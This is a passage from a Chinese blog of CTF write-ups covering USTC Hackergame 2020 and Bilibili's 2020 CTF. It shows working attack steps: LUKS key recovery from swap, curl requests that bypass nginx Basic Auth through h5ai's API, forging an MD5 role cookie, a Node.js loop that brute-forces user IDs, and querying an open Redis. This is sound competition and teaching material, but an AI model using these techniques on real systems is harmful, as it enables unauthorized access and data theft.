U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img 